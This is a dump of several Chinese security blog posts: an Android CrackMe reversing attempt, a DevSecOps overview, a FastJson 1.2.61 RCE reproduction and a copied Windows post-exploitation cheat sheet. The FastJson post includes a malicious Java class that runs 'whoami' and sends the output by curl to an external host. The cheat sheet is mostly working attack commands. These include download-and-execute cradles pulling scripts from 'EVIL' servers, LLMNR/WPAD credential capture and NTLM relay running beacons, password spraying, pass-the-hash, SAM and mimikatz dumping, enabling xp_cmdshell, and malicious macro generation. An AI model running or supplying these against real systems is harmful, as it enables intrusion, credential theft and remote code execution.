int(&#39;32&#39;,16) 50 其中是利用50找到对应的十进制32. 这个点卡了N久，看到一份别人的poc写的是相当简洁了。 CrackMe又是一个native层的APP。 IDA打开伪代码 根据汇编得知，中间for循环处操作的是数组 其中v11是给出的数据块，按照int型，四位一个字段，正好28个字段。 按照Java层逻辑和伪代码写出c代码为 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ int v11[28] = {0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8}; //小端字节序 int v0[28] = {0}; int string[28] = {0}; //未定义,引入的参数变量 int i; for (i=0; i&lt;28; i++){ if (i == 0){ v0[i] = string[i] ^ 0xFF; } else{ v0[i] = string[i] ^ string[i-1]; } } srand(0x133ED6B); int v4[28] = {0}; for (i=0; i&lt;28; i++){ v4[i] = v0[i] - rand(); if (v11[i] != v4[i]){ int v10 = 0; return v10; } int v10 = 1; printf(&quot;%c&quot;,v10); return v10; } } 也就是我们需要反向求出string的值 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ int v11[28] = {0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8}; int v0[28] = {0}; srand(0x133ED6B); for (int i=0; i&lt;28; i++){ v0[i] = v11[i] - rand(); } int string[28] = {0}; for (int i=0; i&lt;28; i++){ if (i==0) string[i] = v0[i] ^ 0xFF; else{ string[i] = v0[i] ^ v0[i-1]; } } for (int i=0; i&lt;28; i++){ printf(&quot;%c&quot;, string[i]); } return 0; } 但是尴尬的是算出来的是乱码 然后没有找到这题的wp….也没找到其他问题的存在点。就这样吧，毕竟是汇编渣渣。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"DevSecOps","slug":"DevSecOps","date":"2019-10-15T05:59:55.000Z","updated":"2019-10-15T09:22:42.778Z","comments":true,"path":"2019/10/DevSecOps/","link":"","permalink":"/2019/10/DevSecOps/","excerpt":"","text":"什么是 DevSecOps?DevOps 不仅仅是开发和运营团队。如果您想要充分发挥出 DevOps 方法的敏捷性和响应力，则必须在应用的整个生命周期内同时兼顾 IT 安全性。 为什么？以往，安全性会在开发的最后阶段由特定的团队来负责实现。当开发周期长达数月、甚至数年时，上述做法不存在任何问题；但是，这种做法现在已经行不通了。有效的 DevOps 可顺利推进快速频繁的开发周期（有时全程只有数周或数天），但是过时的安全措施会对此造成负面影响，即使对于最高效的 DevOps 计划也是如此。 现在，安全防护在 DevOps 协作框架中属于共同责任，而且需要在整个周期中整合相应的安全功能。这是一个非常重要的理念。它还使得“DevSecOps”一词应运而生，以用于强调必须为 DevOps 计划打下扎实的安全基础。 DevSecOps 意味着，从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择正确的工具来持续确保安全性有助于实现安全目标。但是，有效的 DevOps 安全防护需要的不仅是新工具。它建立在 DevOps 文化变革的基础上，以便尽早集成安全团队的工作。 DevOps 安全性为内置特性无论您将其称为“DevOps”还是“DevSecOps”，最好始终能在应用的整个生命周期内确保安全性。DevSecOps 关乎内置安全性，而不是应用和数据层面的安全性。如果将安全性问题留到开发流程的最后环节再加以考虑，那么采用 DevOps 方案的组织会发现自己的开发周期又变长了，而这是他们从一开始就想要避免的情况。 在某种程度上，DevSecOps 强调，在 DevOps 计划刚启动时就要邀请安全团队来确保信息的安全性，并制定自动安全防护计划。它还强调，要帮助开发人员从代码层面确保安全性；在这个过程中，安全团队需要针对已知的威胁分享可见性信息、提供反馈并进行智能分析。这可能还包括为开发人员提供新的安全培训，因为 DevSecOps 并非始终着眼于较为传统的应用开发模式。 那么，怎样才算是真正地实现了内置安全性？对于新手而言，优质的 DevSecOps 策略应能确定风险承受能力并进行风险/收益分析。在一个给定的应用中，需要配备多少个安全控制功能？对于不同的应用，上市速度又有多重要？自动执行重复任务是 DevSecOps 的关键所在，因为在管道中运行手动安全检查可能会非常耗时。 DevOps 安全性可自动实现企业应该：确保采用时间短、频率高的开发周期；采取安全措施，以最大限度地缩短运营中断时间；采用创新技术，如容器和微服务；同时，还要促使常见的孤立团队加强合作 — 这对所有企业来说都是一项艰巨的任务。上述所有举措都与人有关，而且企业内部需要协同合作；但是，自动化才是有助于在 DevSecOps 框架中实现这些人员变化的关键所在。 那么，企业应该在哪些方面实现自动化？具体又该怎么做呢？红帽提供了相应的书面指南来帮助解答上述问题。企业应该退后一步，并着眼于整个开发和运营环境。其中涉及：源控制存储库；容器注册表；持续集成和持续部署 (CI/CD) 管道；应用编程接口 (API) 的管理、编排和发布自动化；以及运营管理和监控。 全新的自动化技术已帮助企业提高了开发实践的敏捷性，还在推动采用新的安全措施方面起到了重要作用。但是，自动化并不是近年来 IT 领域发生的唯一变化。现在，对于大多数 DevOps 计划而言，容器和微服务等云原生技术也是一个非常重要的组成部分。所以，企业必须调整 DevOps 安全措施，以适应这些技术。 DevOps 安全性适用于容器和微服务可通过容器实现的规模扩展和基础架构动态性提升改变了许多组织开展业务的方式。因此，DevOps 安全性实践必须适应新环境并遵循特定于容器的安全准则。云原生技术不适合用来落实静态安全策略和检查清单。相反，组织必须在应用和基础架构生命周期的每个阶段确保持续安全并整合相应的安全功能。 DevSecOps 意味着，要在应用开发的整个过程中确保安全性。要实现与管道的这种集成需要秉持一种全新的思维方式，就像使用新工具一样。考虑到这一点，DevOps 团队应该实现安全防护自动化，以保护整体环境和数据；同时实现持续集成/持续交付流程——可能还要确保容器中的微服务的安全性。 环境和数据安全性：实现环境的标准化和自动化。每项服务都应具有最小的权限，以最大限度地减少未经授权的连接和访问。 实现用户身份和访问控制功能的集中化。由于要在多个点发起身份验证，因此严格的访问控制和集中式身份验证机制对于确保微服务安全性而言至关重要。 使运行微服务的容器相互隔离并与网络隔离。这包括传输中和静止的数据，因为获取这两类数据是攻击者的高价值目标。 加密应用与服务间的数据。具有集成式安全功能的容器编排平台有助于最大限度地降低发生未经授权访问的可能性。 引入安全的 API 网关。安全的 API 可提高授权和路由的可见性。通过减少公开的 API，组织可以减小攻击面。 CI/CD 流程安全性：集成适用于容器的安全性扫描程序。应在向注册表添加容器的过程中实现这一点。 自动在 CI 过程中完成安全性测试。其中包括在构建过程中运行安全性静态分析工具；而且在构建管道中提取任何预构建容器映像时，都要进行扫描，以检查是否存在已知的安全漏洞。 在验收测试流程中加入针对安全性功能的自动化测试。自动执行输入验证测试，并针对验证操作实现身份验证和授权功能的自动化。 自动执行安全性更新，例如针对已知漏洞打修补。通过 DevOps 实现这一点。这样，在创建记录在案的可跟踪更改日志时，管理员便无需登录生产系统。 实现系统和服务配置管理功能的自动化。这样可以确保遵守安全策略，避免出现人为错误。审核和补救操作也应实现自动化。 以上信息来源：https://www.redhat.com/zh/topics/devops/what-is-devsecops DevSevOps 部分实现方案DevSecOps的目标是在短时间内使各种能力的人提高安全性。传统安全性的出发点是，一旦设计了系统，便可以由安全人员确定其安全缺陷，并由业务运营商在发布系统之前对其进行纠正。这允许将有限的安全检查应用于项目，并且避免了在大型系统中增加安全测试环境的需要。但是，以这种方式设计的流程仅在业务活动步伐迅猛且各方都同意的情况下才有效。不幸的是，安全性必须得以保证的理念逐渐被要求后，这个迭代过程便存在安全缺陷，并且此后在系统内部造成了固有风险。 archerysec: 是一个开源漏洞评估和管理工具，可帮助开发人员和渗透测试人员执行扫描和管理漏洞。准确的说这并不是一个完整的DevSecOps实现方案，但是在一般的DevOps中，不需要对Sec进行较大的投入下，满足的基本安全性能保证。当然也可以理解为，开发人员人手一个AWVS、openVAS扫描。 Gitlab+Jenkins+SonarQube：实现动态的代码审计，自动拖代码扫描出结果。目前据所知，有不少企业在这种方式上，开发Sonar插件来进行代码审计的安全性维护。 后面会采用开源的安全架构来实现Sec的功能，内容希望可以类似ossa，但又没必要这么全面。同样部分开源工具也和DevSecOps没太大关系的，但既然DevSecOps是为了每一个人的安全，开源工具在中小型甲方就有较大意义了。 参考文章： What is DevSecOps? Threat Modeling OWASP-AppSecEU awesome-devsecops","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"/tags/Open-Source-Security/"}]},{"title":"FastJson 1.2.61 RCE","slug":"FastJson-1-2-61-RCE","date":"2019-10-14T08:39:05.000Z","updated":"2019-10-14T08:46:38.187Z","comments":true,"path":"2019/10/FastJson-1-2-61-RCE/","link":"","permalink":"/2019/10/FastJson-1-2-61-RCE/","excerpt":"","text":"必备的jar包和Java 1.8.U20： fastjson-1.2.61.jar commons-configuration2-2.0.jar commons-lang3-3.3.2.jar commons-logging-1.2.jar 此处使用IDEA来做复现，首先导入这四个JAR包。创建使用POC的FastJsonTest。 此处使用RMI来做测试。同时创建一个恶意类，使用已经提供的恶意Java文件。 import java.io.BufferedReader; import java.io.InputStreamReader; public class ExportObject { public ExportObject() throws Exception { Process proc = Runtime.getRuntime().exec(&quot;calc&quot;); BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while((line = br.readLine()) != null) { sb.append(line).append(&quot;\\n&quot;); } String result = sb.toString(); Exception e = new Exception(result); throw e; } public static void main(String[] args) throws Exception { } } 当然也可以使用之前版本RCE的恶意Java文件。需要做监听，达到回显的目的。 import java.io.BufferedInputStream; import java.io.BufferedReader; import java.io.InputStreamReader; public class Exploit { public static String exec(String cmd) throws Exception { String sb = &quot;&quot;; BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String lineStr; while ((lineStr = inBr.readLine()) != null) sb += lineStr + &quot;\\n&quot;; inBr.close(); in.close(); return sb; } public Exploit() throws Exception { String result = &quot;&quot;; result = exec(&quot;whoami&quot;); String cmd=&quot;curl http://x.x.x.x/&quot;+result; throw new Exception(exec(cmd)); } public static void main(String[] args) throws Exception { String result = &quot;&quot;; result = exec(&quot;whoami&quot;); String cmd=&quot;curl http://x.x.x.x/&quot;+result; throw new Exception(exec(cmd)); } } 启动一个RMI监听服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#ExportObject 开启一个http服务 python -m SimpleHTTPServer 运行IDEA中的POC，发现可以弹出计算器。 HTTP服务上也有请求的记录。 POC地址：https://github.com/jas502n/fastjson-1.2.61-RCE","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Windows Notes","slug":"Windows-Notes","date":"2019-10-11T02:11:47.000Z","updated":"2019-10-11T02:16:20.073Z","comments":true,"path":"2019/10/Windows-Notes/","link":"","permalink":"/2019/10/Windows-Notes/","excerpt":"","text":"文章是对windows后渗透的利用，提权和持久化等做的详细利用方式。 原文搬运：https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html EnumerationBasicsnet users net users /domain net localgroup net groups /domain net groups /domain &quot;Domain Admins&quot; Get-ADUser Get-Domain Get-DomainUser Get-DomainGroup Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10 Find-DomainShare #Host Discovery netdiscover -r subnet/24 nbtscan -r [range] for /L %i in (1,1,255) do @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL #Reverse DNS Lookup $ComputerIPAddress = &quot;10.10.14.14&quot; [System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName https://github.com/tevora-threat/SharpView Users with SPNGet-DomainUser -SPN Get-ADComputer -filter {ServicePrincipalName -like &lt;keyword&gt;} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack, PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation Kerberos Enumerationnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39; Red-Team CSharp Scripts#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts LDAPUtility.cs Usage: ldaputility.exe options domain [arguments] ldaputility.exe DumpAllUsers m0chan ldaputility.exe DumpUser m0chan mr.un1k0d3r ldaputility.exe DumpUsersEmail m0chan ldaputility.exe DumpAllComputers m0chan ldaputility.exe DumpComputer m0chan DC01 ldaputility.exe DumpAllGroups m0chan ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot; ldaputility.exe DumpPasswordPolicy m0chan Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries. See github linked above for full details. Active Directorynltest /DCLIST:DomainName nltest /DCNAME:DomainName nltest /DSGETDC:DomainName # Get Current Domain Info - Similar to Get-Domain [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() # Get Domain Trust Info - Similar to Get-DomainTrust ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() # View Domain Info [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() # View Domain Trust Information ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships() nltest [server:&lt;fqdn_foreign_domain&gt;] /domain_trusts /all_trusts /v nltest /dsgetfti:&lt;domain&gt; nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() # View All Domain Controllers nltest /dclist:offense.local net group &quot;domain controllers&quot; /domain # View DC for Current Session nltest /dsgetdc:m0chanAD.local # View Domain Trusts from CMD nltest /domain_trusts # View User Info from CMD nltest /user:&quot;m0chan&quot; # get domain name and DC the user authenticated to klist # Get All Logged on Sessions, Includes NTLM &amp; Kerberos klist sessions # View Kerb Tickets klist # View Cached Krbtgt klist tgt # whoami on older Windows systems set u #List all Usernames ([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname #List Administrators ([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname #List all Info about Specific User ([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties #View All Users with Description Field Set ([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % { Write-Host $_.samaccountname : $_.description } AD Enumeration from Linux Box - AD Tool#https://github.com/jasonwbarnett/linux-adtool tar zxvf adtools-1.x.tar.gz cd adtools-1.x ./configure make make install &gt; adtool list ou=user,dc=example,dc=com CN=allusers,OU=user,DC=example,DC=com OU=finance,OU=user,DC=example,DC=com OU=administration,OU=user,DC=example,DC=com &gt; adtool oucreate marketing ou=user,dc=example,dc=com &gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com &gt; adtool setpass jsmith banana &gt; adtool unlock jsmith &gt; adtool groupadd allusers jsmith &gt; adtool attributereplace jsmith telephonenumber 123 &gt; adtool attributereplace jsmith mail jsmith@example.com SharpView Enumeration#https://github.com/tevora-threat/SharpView Get-DomainFileServer Get-DomainGPOUserLocalGroupMapping Find-GPOLocation Get-DomainGPOComputerLocalGroupMapping Find-GPOComputerAdmin Get-DomainObjectAcl Get-ObjectAcl Add-DomainObjectAcl Add-ObjectAcl Remove-DomainObjectAcl Get-RegLoggedOn Get-LoggedOnLocal Get-NetRDPSession Test-AdminAccess Invoke-CheckLocalAdminAccess Get-WMIProcess Get-NetProcess Get-WMIRegProxy Get-Proxy Get-WMIRegLastLoggedOn Get-LastLoggedOn Get-WMIRegCachedRDPConnection Get-CachedRDPConnection Get-WMIRegMountedDrive Get-RegistryMountedDrive Find-InterestingDomainAcl Invoke-ACLScanner Get-NetShare Get-NetLoggedon SMB Enumerationnmap -p 139,445 --script smb.nse,smb-enum-shares,smbls enum4linux 1.3.3.7 smbmap -H 1.3.3.7 smbclient -L \\\\INSERTIPADDRESS smbclient -L INSERTIPADDRESS smbclient //INSERTIPADDRESS/tmp smbclient \\\\\\\\INSERTIPADDRESS\\\\ipc$ -U john smbclient //INSERTIPADDRESS/ipc$ -U john smbclient //INSERTIPADDRESS/admin$ -U john nbtscan [SUBNET] #Check for SMB Signing nmap --script smb-security-mode.nse -p 445 10.10.14.14 SNMP Enumerationsnmpwalk -c public -v1 10.10.14.14 snmpcheck -t 10.10.14.14 -c public onesixtyone -c names -i hosts nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt snmpenum -t 10.10.14.14 MySQL Enumerationnmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 DNS Zone Transferdig axfr blah.com @ns1.m0chan.com nslookup -&gt; set type=any -&gt; ls -d m0chan.com dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml LDAPldapsearch -H ldap://&lt;ip&gt; ldapwhoami RPC Enumerationrpcclient -U &quot;10.10.14.14&quot; srvinfo enumdomusers enumalsgroups domain lookupnames administrators querydominfo enumdomusers queryuser &lt;user&gt; lsaquery lookupnames Guest lookupnames Administrator Remote Desktoprdesktop -u guest -p guest INSERTIPADDRESS -g 94% # Brute force ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS File TransferTFTPm0chan Machine mkdir tftp atftpd --deamon --port 69 tftp cp *file* tftp On victim machine: tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt; FTPecho open &lt;[IP]&gt; 21 &gt; ftp.txt echo USER demo &gt;&gt; ftp.txt echo ftp &gt;&gt; ftp.txt echo bin &gt;&gt; ftp.txt echo GET nc.exe &gt;&gt; ftp.txt echo bye &gt;&gt; ftp.txt ftp -v -n -s:ftp.txt VBS Scriptecho strUrl = WScript.Arguments.Item(0) &gt; wget.vbs echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs echo Err.Clear &gt;&gt; wget.vbs echo Set http = Nothing &gt;&gt; wget.vbs echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs echo http.Send &gt;&gt; wget.vbs echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs echo Set http = Nothing &gt;&gt; wget.vbs echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs echo strData = &quot;&quot; &gt;&gt; wget.vbs echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs echo Next &gt;&gt; wget.vbs echo ts.Close &gt;&gt; wget.vbs cscript wget.vbs &lt;url&gt; &lt;out_file&gt; Use echoup function on pentest.ws to generate echo commands. https://pentest.ws/features Powershell#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles Invoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\\Windows\\Temp\\filename&quot; (New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\\Windows\\Temp\\filename&quot;) #Powershell Download to Memory IEX(New-Object Net.WebClient).downloadString(&#39;http://server/script.ps1&#39;) #Powershell with Proxy $browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX($browser.DownloadString(&#39;https://server/script.ps1&#39;)); Powershell Base64$fileName = &quot;Passwords.kdbx&quot; $fileContent = get-content $fileName $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent) $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes) $fileContentEncoded | set-content ($fileName + &quot;.b64&quot;) Secure Copy / pscp.exepscp.exe C:\\Users\\Public\\m0chan.txt user@target:/tmp/m0chan.txt pscp.exe user@target:/home/user/m0chan.txt C:\\Users\\Public\\m0chan.txt BitsAdmin.execmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\\Temp\\mimikatz.exe &amp; start C:\\Temp\\binary.exe&quot; Remote Desktoprdesktop 10.10.10.10 -r disk:linux=&#39;/home/user/filetransferout&#39; WinHTTP Com Object[System.Net.WebRequest]::DefaultWebProxy [System.Net.CredentialCache]::DefaultNetworkCredentials $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&#39;GET&#39;,&#39;http://EVIL/evil.ps1&#39;,$false);$h.send();iex $h.responseText CertUtil#File Transfer certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename #CertUtil Base64 Transfers certutil.exe -encode inputFileName encodedOutputFileName certutil.exe -decode encodedInputFileName decodedOutputFileName Curl (Windows 1803+)curl http://server/file -o file curl http://server/file.bat | cmd IEX(curl http://server/script.ps1);Invoke-Blah SMBpython smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support ExploitLLMNR / NBT-NS Spoofing#Responder to Steal Creds git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0 LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\\\HRServer\\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like &#39;Yeah I&#39;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&#39; Responder WPAD Attackresponder -I eth0 wpad By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet Go to internet explorer and search for Google which automatically searches for a WPAD file... Then take NTLMv2 hash and NTLM Relay it or send to cracking rig. mitm6#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. By default IPV6 should be enabled. git clone https://github.com/fox-it/mitm6.git cd /opt/tools/mitm6 pip install . mitm6 -d m0chanAD.local Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i -i opens an interactive shell. Shout out to hausec for this super nice tip. SCF File AttackCreate .scf file and drop inside SMB Share and fire up Responder ;) Filename = @m0chan.scf [Shell] Command=2 IconFile=\\\\10.10.14.2\\Share\\test.ico [Taskbar] Command=ToggleDesktop NTLM-RelayGood article explaining differences between NTLM/Net-NTLMV1&amp;V2 https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing. You CAN perform Pass-The-Hash attacks with NTLM hashes. You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes. PS: You CANNOT relay a hash back to itself. PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt This will tell you a list of hosts within a subnet which do not have SMB Signing enabled. python Responder.py -I &lt;interface&gt; -r -d -w ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?) How about we execute a command instead. ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP Priv Exchange#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ Combine privxchange.py and ntlmrelayx ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local Exchange Password Spray#https://github.com/dafthack/MailSniper.git Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\\users.txt -Password Winter2019 #https://github.com/sensepost/ruler ./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v ExchangeRelayX#https://github.com/quickbreach/ExchangeRelayX An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers. ./exchangeRelayx.py -t https://mail.quickbreach.com Exchange Mailbox Post-Compromise#https://github.com/dafthack/MailSniper.git Enumerate GlobalAddressList Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019 Enumerate AD Usernames Get-ADUsernameFromEWS -Emaillist .\\users.txt Enumerate Mailbox Folders Get-MailboxFolders -Mailbox jamie@m0chanAD.local Enumerate Passwords &amp; Credentials Stored in Emails Invoke-SelfSearch -Mailbox jamie@m0chanAD.local Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012 CrackMapExecCrackMapExec is installed on Kali or get Windows Binary from Github. Has 3 Execution Methods crackmapexec smb &lt;- Creating and Running a Service over SMB crackmapexec wmi &lt;- Executes command over WMI crackmapexec at &lt;- Schedules Task with Task Scheduler Can execute plain commands with -X flag i/e crcakmapexec smb 10.10.14.0/24 -x whoami crcakmapexec smb 10.10.14.0/24 &lt;- Host Discovery crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --pass-pol crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --shares Can also PTH with CME crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares --local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS Dump Local SAM hashes crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --local-auth --sam Running Mimikatz crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --local-auth -M mimikatz ^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin Enum AV Products crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --local-auth -M enum_avproducts Mail SniperInvoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019 [*] Now spraying the OWA portal at https://m0chanAD.local/owa/ [*] SUCCESS! User:m0chan:Summer2019 Lmao, you really think Id use the pass Summer2019? Kerberos Stuff#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a #https://m0chan.github.io/Kerberos-Attacks-In-Depth MSSQL Exploiting (PowerUpSQL)#https://github.com/NetSPI/PowerUpSQL #View SQL Instances Get-SQLInstanceDomain [| Get-SQLServerInfo] #Login in with Domain Account Get-SQLConnectionTestThreaded #Login in with Default Password Get-SQLServerDefaultLoginPw #List DB, Tables &amp; Columns Get-SQLInstanceDomain | Get-SQLDatabase Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt; Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt; #Search Column Names for Word Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10 #Try to Execute Commands (RCE) Invoke-SQLOSCmd #Enable XP_CMDShell Process EXEC sp_configure &#39;show advanced options&#39;, 1; go RECONFIGURE; go EXEC sp_configure &#39;xp_cmdshell&#39;, 1; go RECONFIGURE; go xp_cmdshell &#39;&lt;cmd&gt;&#39; go Malicious Macro with MSBuild#https://github.com/infosecn1nja/MaliciousMacroMSBuild #https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild Explained Creation of a Shellcode MSBuild VBA Macro python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba Creation of a PowerShell MSBuild VBA Macro python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba Creation of a Custom MSBuild VBA Macro python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba Creation of a Shellcode MSBuild VBA Macro With Kill Date python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018 Creation of a Shellcode MSBuild VBA Macro With Environmental Keying python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain 